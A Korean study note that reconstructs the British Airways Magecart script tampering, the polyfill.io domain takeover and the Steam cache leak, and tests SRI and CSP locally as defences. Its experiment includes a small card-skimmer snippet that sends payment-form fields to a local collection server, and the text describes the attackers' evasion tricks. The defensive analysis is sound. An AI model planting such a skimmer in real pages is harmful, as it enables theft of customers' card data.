# web-platform/24-web-incidents — 실사건: British Airways 결제 페이지 스크립트 변조(Magecart, 2018) · polyfill.io 도메인 인수 후 악성 코드 배포(2024) · Steam 공유 캐시 교차 노출(2015) — 정리 (힌트)

## 해결하는 문제

leaf 노트는 브라우저 위의 빈틈을 **하나씩** 다룬다.\
페이지에 실린 스크립트가 localStorage를 읽을 수 있다는 것은 06번, 쿠키에 따라 다른 HTML을 URL만 키로 캐시하면 다른 사람에게 보인다는 것은 10번이다.\
실제 사건에서는 이 빈틈이 **신뢰 경로**와 **시간**을 만나 드러난다.

```text
  leaf 노트:  [스크립트는 페이지 권한으로 실행 06-1]  [CORS·출처 05]  [공유 캐시 키 10-2]  [배포·캐시 고착 07·09]
  실사건:
    British Airways 2018  협력사 계정으로 내부망 진입 -> 웹사이트의 JS 파일 하나를 고침
                          -> 결제 폼 값이 공격자 도메인으로 복사(2018-08-21~09-05, 15일)
                          -> 사건 전체(평문 로그 접근 포함)로 약 42.9만 명의 정보에 접근했을 가능성(ICO 4.1)
    polyfill.io 2024      수많은 사이트가 <script src="https://cdn.polyfill.io/..."> 한 줄을 실음
                          -> 도메인 소유자가 바뀜(2024-02) -> 응답에 리다이렉트 코드가 섞임(2024-06 보고)
    Steam 2015            DoS 대응으로 캐시 규칙을 급히 바꿈 -> 인증 사용자 페이지까지 캐시
                          -> 약 34k 사용자의 스토어 페이지가 다른 사용자에게 보였을 수 있음(11:50~13:20 PST)
```

쉬운 예: 식당의 반찬 납품이다.\
BA 사건은 주방 직원 출입증을 훔친 사람이 이미 쓰던 양념통 하나에 무언가를 섞은 것이다. 손님 상에는 늘 쓰던 양념통이 올라가니 아무도 의심하지 않았다.\
polyfill.io 사건은 오래 거래한 납품 업체가 통째로 팔렸는데, 식당들이 계약서를 다시 보지 않고 같은 트럭을 받은 것이다.\
Steam 사건은 손님이 몰리자 "미리 담아 둔 접시"를 늘렸는데, 이름표를 붙여야 할 개인 주문까지 미리 담아 다른 손님에게 낸 것이다.

이 노트는 공개 문서로 세 사건을 복원하고, **브라우저·프론트엔드** 관점의 빈틈만 본다.
- **British Airways(2018)**: 1차 출처 — 영국 정보위원회(ICO) Penalty Notice(2020-10-16, PDF). 공격 코드의 모양은 RiskIQ 분석 글(2018-09-11, 보안 업체 — 2차)로만 확인했다.
- **polyfill.io(2024)**: 출처 — 처음 공개한 Sansec 보고(2024-06-25, 이후 갱신 — 보안 업체라 아래 정의로는 2차), Cloudflare 블로그(2024-06-26, 링크를 바꿔 쓴 CDN 업체 — 사건 당사자가 아니므로 2차). 도메인을 판 쪽·산 쪽의 공식 성명은 이 노트에서 확인하지 못했다 `[?]` — 이 사건은 1차 출처 없이 2차 출처로만 복원했다.
- **Steam(2015)**: 1차 출처 — Valve의 Steam 공지 "Update on Christmas Issues"(2015-12-30). 이 사건은 [10-2](../10-rendering-strategies/2-summary.md)에 이미 있다. 여기서는 배포·운영 관점으로 다시 본다.

  - *사실과 해석*: 원문에 있는 사실은 출처와 함께 쓴다. 원문이 말하지 않는 추론은 "해석"이라고 표시한다.
  - *1차 출처*: 사건 당사자·규제기관이 직접 낸 문서다. 보안 업체·언론 분석은 2차로 따로 표시한다.
  - *Magecart*: 결제 폼에 스크립트를 심어 카드 정보를 빼 가는 웹 스키밍 공격자를 RiskIQ가 부른 이름이다. RiskIQ 원문은 "web-based card skimmers operated by the threat group Magecart"라고 쓴다. ICO Penalty Notice에는 이 이름이 없다.

## 동작·원리

### 0. 공통 그림 — 페이지에 실린 코드는 페이지와 같은 권한으로 돈다

```text
  사용자 브라우저 (출처 https://shop.example)
  ┌──────────────────────────────────────────────────────────────────────┐
  │  HTML ── <script src="/js/lib.js">          ── 1st party 서버 ◀── (BA: 이 파일이 고쳐짐)
  │       └─ <script src="https://cdn.x/p.js">   ── 3rd party CDN  ◀── (polyfill.io: 이 도메인의 주인이 바뀜)
  │                                                                      │
  │  두 스크립트 모두 같은 전역·같은 DOM·같은 저장소를 본다                       │
  │    document.getElementById('paymentForm')  → 카드 번호 입력값               │
  │    localStorage / 쿠키(HttpOnly 제외)       → 토큰 (06-1)                  │
  │    fetch('https://공격자/…') / location.href = '…'  → 밖으로 보내기·이동      │
  └──────────────────────────────────────────────────────────────────────┘
           ▲                                  ▲
           │ SRI: "이 해시가 아니면 실행 안 함"     │ CSP: "이 출처로만 연결·로드"
           (실험 24-A: 변조 차단, 대신 기능도 멈춤)  (실험 24-A: fetch 유출 차단, 최상위 이동은 못 막음)
```

- 그림 해설: `<script>`로 실은 코드는 출처가 어디든 **그 페이지의 출처로** 실행된다. 동일 출처 정책(05·01)은 "다른 출처의 응답을 읽는 것"을 막지, "내가 실은 남의 코드가 내 페이지를 읽는 것"은 막지 않는다.
- 그래서 방어는 둘로 나뉜다. **실행 전**에 코드가 내가 아는 그 코드인지 확인(SRI·변경 감지)하고, **실행 뒤**에 코드가 할 수 있는 일을 줄인다(CSP·HttpOnly 쿠키·결제 필드 분리).
  - *SRI(Subresource Integrity)*: `<script integrity="sha384-…">`처럼 기대하는 해시를 적어 두면, 브라우저가 받은 본문의 해시를 계산해 다르면 실행하지 않는 W3C 표준이다.
  - *CSP(Content Security Policy)*: 응답 헤더(또는 `<meta>`)로 "스크립트는 어디서만, 연결은 어디로만" 같은 허용 목록을 주는 W3C 명세다(Level 2는 권고안, Level 3은 작업 초안). 강제 정책(`Content-Security-Policy`)의 위반은 차단되고 `securitypolicyviolation` 이벤트가 난다. `Content-Security-Policy-Report-Only` 정책은 위반을 보고만 하고 막지 않는다.

### 사건 1 — British Airways 결제 페이지 스크립트 변조 (2018)

출처: ICO, "Penalty Notice — British Airways plc", 2020-10-16 <https://ico.org.uk/media2/migrated/2618421/ba-penalty-20201016.pdf>(이하 "ICO"; 단락 번호는 원문 기준. 원문 일부는 검게 가려져 있다) · (2차) Yonathan Klijnsma, RiskIQ, "Inside the Magecart Breach of British Airways: How 22 Lines of Code Claimed 380,000 Victims", 2018-09-11 — 원 URL은 현재 다른 곳으로 넘어가므로 Internet Archive 사본 <https://web.archive.org/web/20181231220607/https://www.riskiq.com/blog/labs/magecart-british-airways-breach/>로 읽었다.

#### 사실 — 날짜 (ICO)

| 날짜 | 사건 | 출처(원문) |
|---|---|---|
| 2018-06-22 | 공격자가 협력사(Swissport, 화물 서비스) 직원의 탈취된 계정으로 Citrix 원격 접속 게이트웨이에 들어옴 | ICO 1.2, 3.4~3.8: "gained access to an internal BA application through the use of compromised credentials for a Citrix remote …" |
| (이후) | Citrix 환경을 벗어나 내부망 정찰, 평문으로 저장된 파일에서 도메인 관리자 계정의 사용자명·비밀번호 획득 | ICO 3.9~3.16 ("Step 2: Breaking out of Citrix", "Step 3: Privilege escalation" — 3.15 "The login details were stored in plain text") |
| 2018-08-14~08-25 | 공격자가 결제 카드 데이터를 "BAways.com"으로 보내도록 코드를 고침(구체 방법은 가려짐) | ICO 3.25: "Between 14 August 2018 and 25 August 2018, the Attacker … to redirect customer payment card data to a different website: "BAways.com"" |
| 2018-08-21 ~ 09-05 | 변조 코드가 사이트에서 15일간 동작 | ICO 3.25: "remained active on BA's website for a period of 15 days between 21 August 2018 and 5 September 2018" |
| 2018-09-05 | 제3자가 "britishairways.com에서 BAways.com으로 데이터가 간다"고 BA에 알림. 90분 안에 악성 코드를 무력화, 20분 뒤 BAways.com URL 경로 차단 | ICO 3.26 |
| 2018-09-06 | BA가 ICO·매입사·카드 브랜드에 신고, 고객 496,636명에게 통지(9-07에 39,480명 추가) | ICO 3.27, 5.2 |
| 2019-07-04 | ICO 과징금 부과 예고(NOI) £183.39m | ICO 5.3 |
| 2020-10-16 | 최종 과징금 £20m | ICO 1.7 |

#### 사실 — 무엇이 어떻게 (ICO + RiskIQ)

- ICO 1.2: 공격은 "the editing of a Javascript file on BA's website (www.britishairways.com)"에서 끝났다. 수정은 "designed to enable the exfiltration of cardholder data from the "britishairways.com" website to an external third-party domain (www.BAways.com)".
- ICO 3.25: 변조가 동작하는 동안 "when customers entered payment card information into BA's website, a copy was sent to the Attacker, without interrupting the normal BA booking and payment procedure."
- ICO 4.1: 약 429,612명의 개인정보에 접근했을 가능성 — 이름·주소·카드 번호·CVV 244,000명, 카드 번호·CVV만 77,000명, 카드 번호만 108,000명, BA 직원·관리자 계정, Executive Club 계정 최대 612개.
  - ICO 3.21~3.22는 웹 변조와 별도 경로도 적는다. 공격자가 2018-07-26에 리딤(마일리지) 거래의 카드 정보가 평문으로 든 로그 파일에 접근했다. 이 로깅은 시험용 기능이 운영에서 켜진 채 남은 것으로, 2015-12부터 기록됐고(대부분 CVV 포함) 보관 기간 95일 안의 약 108,000장이 노출될 수 있었다. 4.1의 "카드 번호만 108,000명"과 수가 같지만, 같은 집합이라고 원문이 명시하는지는 확인하지 못했다 `[?]`.
- RiskIQ(2차): 변조된 파일은 "a modified version of the Modernizr JavaScript library, version 2.6.2"였고 수하물 안내 페이지에서 실렸다. 변경은 파일 **맨 끝**에 붙었다("a technique we often see when attackers modify JavaScript files to not break functionality"). 정리하면 22줄이다. 동작: 페이지 로드 뒤 `submitButton`에 `mouseup`·`touchend`를 걸고, `paymentForm`과 `personPaying`을 직렬화해 JSON으로 baways.com 서버에 보낸다.
- RiskIQ(2차)가 변조를 찾은 방법: 사이트의 스크립트를 주기적으로 수집해 **내용이 바뀐 것만** 다시 봤다. 서버의 `Last-Modified` 헤더가 깨끗한 판은 2012-12, 변조판은 피해 시작 시각과 가까웠다고 쓴다.
- ICO 6.92~6.93: BA가 둘 수 있었던 대책으로 **file integrity monitoring**을 든다 — "allows the system to detect and alert an organisation to changes being made to its code. While it does not stop an attacker from changing the code, it allows the organisation to detect that changes have been made". 당시 PCI DSS 3.2.1 요구 10.5.5·11.5(핵심 파일 변경 감지, 최소 주 1회 비교)를 인용한다.

```text
  BA 결제 페이지 (RiskIQ 설명 기준)

  사용자 ── 카드 입력 ── [결제 버튼 mouseup/touchend]
                             │
                             ├──▶ 원래 결제 요청 ──▶ britishairways.com   (정상 진행, 사용자는 아무것도 못 느낌)
                             │
                             └──▶ 복사본(JSON) ────▶ baways.com           (Modernizr 2.6.2 끝에 붙은 22줄)

  BA 서버 쪽 기록:  정상 결제 성공  (에러 0)
  드러난 경로:      제3자가 baways.com으로 가는 POST를 보고 알림 (ICO 3.26 각주 20)
```

#### 해석

- 해석: 사용자 흐름을 **깨지 않았기 때문에** 15일을 버텼다. 23번 색인의 "예외 없는 장애"와 같은 모양이다 — 에러율·전환율 지표에는 아무것도 안 보였을 것이다.
- 해석: 변조 대상이 **1st party 파일**이었다. "서드파티 CDN만 조심하면 된다"는 가정이 틀렸다. 공격자가 HTML까지 고칠 수 있다면 HTML의 SRI 해시도 함께 고칠 수 있으므로, 이 경우 SRI보다 서버 쪽 변경 감지(ICO가 든 file integrity monitoring)와 연결 대상 제한(CSP `connect-src`)이 더 직접적인 대책이다.
- 해석: 수하물 안내 페이지와 결제 페이지가 **같은 라이브러리 파일**을 실었다. 결제 페이지에 실리는 스크립트 수를 줄이는 것(아래 PCI DSS v4 6.4.3)이 공격 면을 줄인다.

### 사건 2 — polyfill.io 도메인 인수 후 악성 코드 배포 (2024)

출처(둘 다 2차 — 보안 업체·CDN 업체): Sansec Forensics Team, "Polyfill supply chain attack hits 100K+ sites", 2024-06-25(06-26·27·28 갱신) <https://sansec.io/research/polyfill-supply-chain-attack> · Matthew Prince·John Graham-Cumming·Michael Tremante, "Automatically replacing polyfill.io links with Cloudflare's mirror for a safer Internet", Cloudflare Blog, 2024-06-26 <https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet/>(둘 다 2026-10-04 조회).

#### 사실 — 날짜

| 날짜 | 사건 | 출처(원문) |
|---|---|---|
| 2024-02 | polyfill.io 도메인(과 GitHub 계정)이 새 주인에게 팔림 | Cloudflare: "Back in February, the domain polyfill.io … was sold to a new owner: Funnull, a relatively unknown company." Sansec: "in February this year, a Chinese company bought the domain and the Github account." |
| 2024-02 | Cloudflare가 우려해 cdnjs에 자체 미러를 만듦 | Cloudflare: "This led us to spin up our own mirror of the polyfill.io code hosted under cdnjs" |
| 2024-06-08 15:23:51 | Cloudflare Page Shield가 IoC와 일치하는 JS를 처음 본 시각 | Cloudflare: "starting as far back as 2024-06-08 15:23:51 (first seen timestamp on Page Shield detected JavaScript file)" |
| 2024-06-25 | Sansec 공개 보고. 같은 날 Google이 polyfill.io를 쓰는 전자상거래 사이트의 Google Ads를 막기 시작했다고 Sansec이 갱신 | Sansec 본문·"Update June 25th" |
| 2024-06-26 | Cloudflare가 프록시하는 사이트의 polyfill.io 링크를 자기 미러로 자동 재작성(무료 요금제는 기본 켬) | Cloudflare 블로그 |
| 2024-06-27 | Namecheap이 도메인을 정지("on hold") | Sansec "Update June 27th" |
| 2024-06-28 | 같은 행위자가 적어도 2023-06부터 쓴 다른 도메인들(bootcdn.net·bootcss.com·staticfile.net 등) 공개 | Sansec "Update June 28th" |

#### 사실 — 무엇이 어떻게

- Sansec: "The polyfill.js is a popular open source library to support older browsers. 100K+ sites embed it using the cdn.polyfill.io domain."
- Cloudflare: 사용 규모 추정 "nearly 4% of all websites"(추정치라고 명시). 도메인을 바로 막지 않은 이유: "we are concerned it could cause widespread web outages".
- Sansec: "The polyfill code is dynamically generated based on the HTTP headers, so multiple attack vectors are likely." — 응답이 요청 헤더(User-Agent 등)에 따라 달라진다.
- Sansec이 해독한 한 표본의 동작
  - User-Agent가 모바일 패턴(`iPhone|Android|Mobile` 등)에 맞을 때만 동작한다. 그래도 `navigator.platform`이 Windows·Mac이면(`isPc()`가 참) 건너뛴다.
  - 시간대별 확률(예: 0~2시 10%)로 `www.googie-anaiytics.com`의 스크립트를 불러, 조건이 맞으면 `window.location.href`로 스포츠 베팅 사이트로 보낸다.
  - 쿠키에 `admin_id`·`adminlevels`가 있으면 동작하지 않는다(관리자 회피).
  - 페이지에 웹 분석 도구(google-analytics·googletagmanager·plausible 등)가 있으면 2초 늦게 실행한다.
- Cloudflare 재작성의 한계(원문): "The logic will not activate if a Content Security Policy (CSP) header is found in the response."
- Cloudflare가 권한 일: 코드에서 polyfill.io 참조를 찾아 `cdnjs.cloudflare.com/polyfill/`로 바꾸거나 제거한다. Sansec: "The original polyfill author recommends to not use Polyfill at all, as it is no longer needed by modern browsers anyway."

```text
  수많은 사이트                         cdn.polyfill.io (2024-02 주인 바뀜)
  <script src="https://cdn.polyfill.io/v3/polyfill.min.js?features=...">
        │  요청: User-Agent = 데스크톱  ──▶  정상 폴리필
        │  요청: User-Agent = 모바일    ──▶  폴리필 + 리다이렉트 코드 (시간·확률·관리자 쿠키 조건)
        ▼
  사이트 출처로 실행 → location.href = 베팅 사이트

  사이트 운영자의 데스크톱 브라우저:  아무 일 없음   ← "재현 안 됨"
  모바일 일부 사용자:                 다른 사이트로 튕김
```

#### 해석

- 해석: 코드는 한 줄도 안 바뀌었다. **URL이 가리키는 주인이 바뀌었다.** 버전 고정(`package.json`)·코드 리뷰는 `<script src>`의 외부 도메인을 보지 않는다.
- 해석: 응답이 User-Agent마다 다르기 때문에 **SRI 해시를 하나로 고정할 수 없다.** 그래서 이런 동적 폴리필 서비스는 처음부터 SRI로 보호하기 어렵고, 자체 호스팅(빌드 시 필요한 폴리필만 번들에 포함 — 09)이 근본 대책이다. 실험 24-A의 5·6번이 이 성질을 재현한다.
- 해석: 조건부·확률적·관리자 회피 동작은 **운영자의 재현을 일부러 피한다.** 23번 색인의 "랩에서 재현이 안 돼서 닫음"(장애 시나리오 3)이 공격자에게 유리하게 쓰인 꼴이다. 실제 사용자 브라우저에서 실린 스크립트를 수집하는 방식(Cloudflare Page Shield, Sansec이 권한 CSP 보고)이 탐지 경로였다.
- 해석: 리다이렉트는 최상위 이동(`location.href`)이라, 이 노트 실험의 `connect-src` 제한으로는 막히지 않았다(실험 24-A 8번). CSP로 막으려면 애초에 `script-src`가 그 도메인을 허용하지 않아야 한다.

### 사건 3 — Steam 공유 캐시 교차 노출 (2015-12-25)

출처: Valve, "Update on Christmas Issues", Steam News, 2015-12-30 <https://store.steampowered.com/news/19852/>(2026-10-04 조회, `/oldnews/19852`로 넘어감).

#### 사실 (Valve 원문)

- 무엇: "On December 25th, a configuration error resulted in some users seeing Steam Store pages generated for other users. Between 11:50 PST and 13:20 PST store page requests for about 34k users, which contained sensitive personal information, may have been returned and seen by other users."
- 노출 범위: 일부 페이지에 청구 주소, Steam Guard 전화번호 끝 4자리, 구매 내역, 카드 번호 끝 2자리, 이메일. "These cached requests did not include full credit card numbers, user passwords, or enough data to allow logging in as or completing a transaction as another user."
- 어떻게: 크리스마스 아침 DoS 공격, "traffic to the Steam store increased 2000% over the average traffic during the Steam Sale". 캐시 파트너가 캐시 규칙을 배포했고, "During the second wave of this attack, a second caching configuration was deployed that incorrectly cached web traffic for authenticated users."
- 증상의 폭: "Incorrect Store responses varied from users seeing the front page of the Store displayed in the wrong language, to seeing the account page of another user."
- 복구: 스토어를 내리고 새 캐시 설정을 배포, 모든 캐시 설정 검토 + "all cached data on edge servers had been purged" 확인 뒤 재개.

#### 해석

- 해석: 장애 대응 중의 **급한 캐시 설정 변경**이 두 번째 사고를 만들었다. 부하를 줄이려는 변경(캐시 늘리기)과 개인화 응답의 경계(`Cache-Control: private`, 쿠키 있는 요청 우회)가 충돌했다. 10-2의 실험(`cookie user=bob /me → alice님의 주문 내역`)과 같은 구조다.
- 해석: "잘못된 언어의 첫 화면"도 같은 원인의 다른 얼굴이다. 언어·로캘이 쿠키·`Accept-Language`로 정해지는데 캐시 키에 없으면 생긴다 — 개인정보가 아닌 증상이 먼저 보일 수 있다는 뜻이다([12](../12-internationalization-and-localization/2-summary.md), [14-4](../14-image-optimization/2-summary.md)의 `Vary` 누락과 같은 계열).
- 해석: 복구에 **엣지 캐시 전체 퍼지 확인**이 들어갔다. 07-1(SW 캐시 고착)과 마찬가지로, 잘못 저장된 응답은 설정을 고친 뒤에도 남아 있다.

### 실험: 변조된 스크립트 — SRI·CSP가 무엇을 막고 무엇을 못 막나 (로컬 재현)

사건의 **메커니즘 하나**(페이지가 실은 스크립트 끝에 덧붙인 코드가 폼 값을 다른 출처로 보냄)를 로컬에서 재현했다. 데이터는 더미 값(`TEST-0000`)이고, 모든 서버는 127.0.0.1의 임의 포트다.

- 구성: 사이트(포트 A)가 "CDN"(포트 C)의 `lib.js`를 싣는다. 변조 모드에서 CDN은 원래 본문 뒤에 "스키머"를 덧붙인다 — `submit` 때 `FormData`를 JSON으로 수집 서버(포트 X)에 `fetch` 한다. `ua.js`는 User-Agent에 `Mobile`이 있으면 본문 끝에 주석 한 줄을 더 붙인다(polyfill.io처럼 UA별 생성). `redir.js`는 `location.href`로 수집 서버로 이동한다.
- 환경: Node `http` 서버 3개(127.0.0.1), Playwright `playwright-core` + `/usr/bin/google-chrome` headless, 각 경우 새 브라우저 컨텍스트, 모바일은 `userAgent`만 바꿈.

```js
// 핵심 — 덧붙인 "스키머"(더미 수집)
addEventListener('load', () => document.getElementById('pay').addEventListener('submit', e => {
  e.preventDefault();
  const d = Object.fromEntries(new FormData(e.target));
  fetch('http://127.0.0.1:<X>/c', { method: 'POST', mode: 'no-cors', body: JSON.stringify(d) }).catch(() => {});
}));

// SRI 해시 = 변조 전 본문 기준 (Node)
const sri = s => 'sha384-' + crypto.createHash('sha384').update(s).digest('base64');
// <script src="http://127.0.0.1:<C>/lib.js" integrity="${sri(LIB)}" crossorigin="anonymous">
// CSP: <meta http-equiv="Content-Security-Policy" content="connect-src 'self'">
```

`(실험, headless Chrome 151.0.7922.173, 2026-10-04 — 포트는 PORT로 가림. 콘솔의 computed 해시는 가리지 않았다)`

```text
[1 변조 전, 방어 없음] libLoaded=true 수집서버 수신=[] 위반=[]
[2 변조 후, 방어 없음] libLoaded=true 수집서버 수신=["{\"card\":\"TEST-0000\"}"] 위반=[]
[3 변조 후, SRI] libLoaded=false 수집서버 수신=[] 위반=[]
   console: Failed to find a valid digest in the 'integrity' attribute for resource 'http://127.0.0.1:PORT/lib.js' with computed SHA-384 integrity '8Rf+DFw6CUBr3AaaAtRcZGPG/ojhHjgL7l0udbDf8+I8n6Hh/6e/td2PQcDkYsyk'. The resource has been block…
[4 변조 후, CSP connect-src self] libLoaded=true 수집서버 수신=[] 위반=["connect-src http://127.0.0.1:PORT/c"]
   console: Connecting to 'http://127.0.0.1:PORT/c' violates the following Content Security Policy directive: "connect-src 'self'". The action has been blocked.
   console: Fetch API cannot load http://127.0.0.1:PORT/c. Refused to connect because it violates the document's Content Security Policy.
[5 UA별 응답, 데스크톱 해시 + 데스크톱] libLoaded=true 수집서버 수신=[] 위반=[]
[6 UA별 응답, 데스크톱 해시 + 모바일] libLoaded=false 수집서버 수신=[] 위반=[]
   console: Failed to find a valid digest in the 'integrity' attribute for resource 'http://127.0.0.1:PORT/ua.js' with computed SHA-384 integrity 'uYDWbPwq44jciGrugj1h6LCAxLqI0H4Clqwyh3LvrW2K1rL72pWmZ4XQOjm9bia1'. The resource has been blocke…
[7 SRI인데 crossorigin 없음(변조 전)] libLoaded=false 수집서버 수신=[] 위반=[]
   console: Subresource Integrity: The resource 'http://127.0.0.1:PORT/lib.js' has an integrity attribute, but the resource requires the request to be CORS enabled to check the integrity, and it is not. The resource has been blocked because t…
[8 리다이렉트 삽입, CSP connect-src self] libLoaded=n/a(이동함) 수집서버 수신=["LANDING"] 위반=[]
```

- 출력은 두 번 돌려 같은 결과였다(8번은 두 번째 실행에서 추가). 사실 점검 때 두 번 더 돌려 1~8번 결과가 같았다. 다만 3번 콘솔의 computed 해시는 실행마다 다르다 — 변조 본문에 수집 서버의 임의 포트가 들어가기 때문이다(6번 해시는 포트와 무관해 같다). 콘솔 줄은 길어서 230자에서 잘랐다. 3·6·7번의 콘솔 메시지는 같은 줄이 두 번씩 찍혔다(한 번만 실었다).

관찰과 해석:
- **2번**: 방어가 없으면 폼 값이 다른 출처로 그대로 나갔다. 페이지 기능(`libLoaded=true`)은 멀쩡하다 — BA 사건의 "결제 흐름을 깨지 않고 복사"(ICO 3.25)와 같은 모양이다.
- **3번 SRI**: 변조된 파일은 실행되지 않았다. 대신 원래 라이브러리도 실행되지 않았다(`libLoaded=false`). SRI는 **실패 시 닫힘(fail closed)**이다 — 유출 대신 기능 장애가 된다.
- **4번 CSP `connect-src 'self'`**: 변조 코드는 실행됐지만 다른 출처로의 `fetch`가 막혔고 `securitypolicyviolation`이 남았다. 이 위반 이벤트를 보고 엔드포인트로 모으면 탐지 신호가 된다(CSP의 `report-to` — 이 실험에서는 수집만 확인).
- **5·6번**: User-Agent마다 본문이 다르면 한 해시로는 한쪽이 막힌다. polyfill.io 같은 UA별 생성 서비스에는 SRI를 걸기 어렵다는 뜻이다(사건 2 해석).
- **7번**: 다른 출처 스크립트에 `integrity`만 쓰고 `crossorigin`을 빼면, 변조가 없어도 막힌다. 해시를 검사하려면 CORS 요청이어야 하고, 그 서버가 `Access-Control-Allow-Origin`을 줘야 한다.
- **8번**: `connect-src`는 최상위 이동(`location.href`)을 막지 않았다. 이 실험의 CSP 하나로는 polyfill.io 표본의 리다이렉트를 막지 못한다. 막을 곳은 그 스크립트가 실리는 단계(`script-src`)다.

## 쓰이는 자료구조·알고리즘

- **암호 해시(SHA-256/384/512)로 내용 식별**: SRI는 본문의 해시를 기대값과 비교한다. 한 바이트만 달라도 값이 달라진다(실험 3·6번). 같은 원리가 빌드 산출물의 해시 파일명(09)에 쓰이고, 일부 ETag 구현도 콘텐츠 해시로 만든다(ETag 자체는 불투명한 검증자라 리비전 번호 등으로도 만든다 — RFC 9110 §8.8.3, network/34). → [security 영역 표](../../security/README.md)(암호 해시 — 미작성)
- **변경 감지 = 이전 스냅숏과의 비교(diff)**: ICO가 든 file integrity monitoring과 RiskIQ의 크롤링 방식은 "파일별 해시를 저장해 두고 바뀐 것만 본다"로 요약된다. 해시 맵(경로 → 해시)과 주기적 비교다.
- **허용 목록(집합 소속 판정)**: CSP는 지시어별 출처 집합에 요청 URL이 속하는지 본다. 지시어(또는 대체 지시어 `default-src`)를 설정한 종류는 목록에 없으면 막는다. 그래서 목록이 짧을수록 공격 면이 작다. 둘 다 없는 종류는 CSP가 제한하지 않으므로, 기본 거부로 시작하려면 `default-src 'none'` 등을 명시한다.
- **캐시 키 합성**: Steam 사건은 캐시 키(URL)에 응답을 바꾸는 입력(인증 쿠키·언어)이 빠진 것이다. 키에는 응답을 바꾸는 입력이 빠짐없이 들어가야 하고, 그게 불가능한 응답(개인화)은 공유 캐시에 넣지 않는다([10-2](../10-rendering-strategies/2-summary.md), [network/34](../../network/34-http-caching/2-summary.md)).

## 적용 — 풀어나가는 법

### 사건 → leaf 대응

| 사건의 메커니즘 | 이 영역 leaf | 대처 요지 |
|---|---|---|
| 실린 스크립트가 페이지와 같은 권한으로 폼·저장소를 읽음 | [06-1](../06-browser-storage/2-summary.md) | 토큰은 HttpOnly 쿠키·BFF, CSP·SRI로 스크립트 공급망 축소 |
| 변조가 사용자 흐름을 깨지 않아 오래 감 | [23](../23-web-symptom-index/2-summary.md) "예외 없는 장애" | 실린 스크립트 목록·내용의 변경 감지, CSP 위반 수집 |
| 외부 `<script src>` 도메인의 주인 변경 | [09](../09-js-modules-and-bundling/2-summary.md)(번들·의존 그래프) | 외부 CDN 런타임 의존을 빌드 시 번들·자체 호스팅으로 |
| 응답이 User-Agent별로 달라 재현·해시 고정이 어려움 | [08-1](../08-web-performance-vitals/2-summary.md)·[20-4](../20-performance-budgets-and-regression-gates/2-summary.md)(랩 vs 필드) | 실제 사용자 브라우저에서 실린 스크립트 수집(RUM·CSP 보고) |
| 인증 응답을 URL만 키로 공유 캐시 | [10-2](../10-rendering-strategies/2-summary.md) | `Cache-Control: private`/`no-store`, 쿠키 있는 요청 캐시 우회, 배포 전 확인 |
| 잘못 저장된 캐시가 설정 수정 뒤에도 남음 | [07-1](../07-service-workers-and-offline/2-summary.md)·[09-2](../09-js-modules-and-bundling/2-summary.md) | 퍼지·`Clear-Site-Data`·해제용 워커 경로를 미리 준비 |
| 다른 출처 스크립트·폰트의 CORS 요구 | [05](../05-fetch-from-browser/2-summary.md)·[15-4](../15-web-font-loading/2-summary.md) | SRI·폰트 모두 `crossorigin` + 서버 ACAO |

### 결제·로그인 페이지의 스크립트 다루기 — 순서

1. **목록부터 만든다.** 결제 페이지에 실제로 실리는 스크립트(1st·3rd party, 태그 매니저가 넣는 것 포함)를 실제 브라우저에서 수집한다. 필요 없는 것은 뺀다. PCI SSC는 PCI DSS v4.x 요구 6.4.3·11.6.1이 "payment page scripts are properly authorized, checked for integrity, and monitored for tampering"을 다룬다고 쓴다(PCI SSC 블로그 — 요구 원문은 이 노트에서 읽지 않았다 `[?]`).
2. **고정된 외부 스크립트에는 SRI + `crossorigin`.** 판이 고정된 파일(예: 특정 버전 URL)에 쓴다. `integrity`에 해시를 여러 개 적으면 그중 하나만 맞아도 통과하므로(W3C SRI §3.3.4) 알려진 소수의 변형은 각각 적을 수 있다. 하지만 변형이 많거나 예고 없이 바뀌는 서비스(UA별 생성·"최신" URL)는 해시 관리가 어려워 맞지 않는다(실험 5·6은 해시 하나만 적은 경우).
3. **동적 외부 서비스는 자체 호스팅으로 바꾼다.** 폴리필처럼 빌드 시 결정할 수 있는 코드는 번들에 넣는다(09).
4. **CSP를 report-only로 먼저 건다.** `script-src`·`connect-src`를 좁히고 위반 보고를 모아 정상 흐름을 확인한 뒤 강제로 바꾼다. `connect-src`만으로는 최상위 이동을 못 막는다(실험 8번).
5. **서버 쪽 변경 감지를 둔다.** 배포 산출물의 해시 목록과 서빙 중인 파일을 주기적으로 비교한다(ICO 6.92의 file integrity monitoring). 배포 파이프라인 밖의 변경은 경보로 다룬다.
6. **카드 입력을 페이지 밖으로.** 결제 대행사의 호스팅 필드(다른 출처 iframe)를 쓰면 페이지 스크립트가 입력값을 직접 읽지 못한다(동일 출처 정책 — 01·05). 이 방식이 사건의 경로를 끊는다는 것은 해석이다.

```js
// 4번 — 위반을 모으는 최소 코드(보고 엔드포인트가 없을 때의 대안)
addEventListener('securitypolicyviolation', e => {
  navigator.sendBeacon('/csp-report', JSON.stringify({
    directive: e.violatedDirective, blocked: e.blockedURI, source: e.sourceFile, line: e.lineNumber,
  }));
});
```

### 공유 캐시 규칙을 바꿀 때 — Steam 사건에서

1. 개인화 응답(로그인 상태·쿠키·언어로 달라짐)에 `Cache-Control: private`(또는 `no-store`)를 서버가 붙인다. CDN 규칙에 기대지 않는다.
2. 장애 대응 중 캐시 규칙 변경도 배포다. 쿠키가 다른 두 계정으로 같은 URL을 요청해 응답이 다른지 확인하는 점검을 둔다(10 실험과 같은 검사).
3. 잘못 캐시된 응답을 지우는 경로(퍼지 범위·완료 확인)를 미리 연습한다.

## 장애 시나리오와 대처

### 1. SRI를 걸었더니 일부 사용자만 기능이 사라졌다

- **현상**: 배포 뒤 모바일 일부에서 버튼이 동작하지 않는다.
- **보이는 형태**: 콘솔 `Failed to find a valid digest in the 'integrity' attribute for resource '…' with computed SHA-384 integrity '…'. The resource has been blocked.`(실험 6번).
- **원인**: 외부 서비스가 User-Agent·`Accept` 등에 따라 다른 본문을 준다. 또는 "최신" URL이라 본문이 바뀌었다.
- **대처**: 그 파일을 자체 호스팅하거나 판이 고정된 URL로 바꾼다. SRI 실패를 RUM으로 모은다(`error` 이벤트·콘솔 수집).

### 2. `integrity`를 넣었더니 변조가 없는데도 스크립트가 막힌다

- **현상**: SRI 도입 직후 외부 스크립트가 전부 실행되지 않는다.
- **보이는 형태**: 콘솔 `Subresource Integrity: The resource '…' has an integrity attribute, but the resource requires the request to be CORS enabled to check the integrity, and it is not.`(실험 7번).
